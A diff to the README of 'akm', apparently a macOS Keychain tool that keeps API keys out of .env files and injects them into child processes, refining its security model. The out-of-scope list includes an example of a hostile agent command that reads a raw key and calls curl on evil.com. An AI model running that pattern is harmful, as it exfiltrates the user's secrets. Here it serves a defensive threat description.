@@ -31,7 +31,7 @@ Built for the era of AI coding agents. Every agent with shell access can read `.
 ## What it does
 
 - **Stores keys in the macOS Keychain** instead of `.env` files, so plaintext never sits on disk.
-- **Injects keys into child processes** via `execve` — `ps`, shell history, and your scrollback stay clean.
+- **Injects keys into child processes** via `execve` — values do not appear in argv (`ps -ef`), shell history, or scrollback. (Same-user `ps -E` does expose the child's environment; that is consistent with the threat model: a process running as you can already read your keychain.)
 - **Pushes keys to Vercel, GitHub, and Fly** so deployment-secret setup stops being a copy-paste tax.
 
 ## Install
@@ -84,9 +84,9 @@ If you are the agent reading this: run `akm agent-info --json` and use it.
 
 ## Security model
 
-**In scope:** plaintext `.env` files on disk, keys in shell history, keys in `ps` output, keys committed to git by an overeager agent, keys re-appearing in agent transcript context, build-tool printouts leaking secrets.
+**In scope:** plaintext `.env` files on disk, keys in shell history, keys in `ps -ef` argv listings, keys committed to git by an overeager agent, keys re-appearing in agent transcript context, build-tool printouts leaking secrets.
 
-**Out of scope:** malware running as your user, a hostile agent that runs `akm get NAME --raw && curl evil.com`. Those threats need a different tool. Every access is logged so you can review the trail after the fact.
+**Out of scope:** malware running as your user; a hostile agent that runs `akm get NAME --raw && curl evil.com`; same-user `ps -E` of an `akm run` child (the env IS the transport). Those threats need a different tool. Every access is logged to `~/.akm/audit.log` (mode 0600) so you can review the trail after the fact.
 
 ## Contributing
 
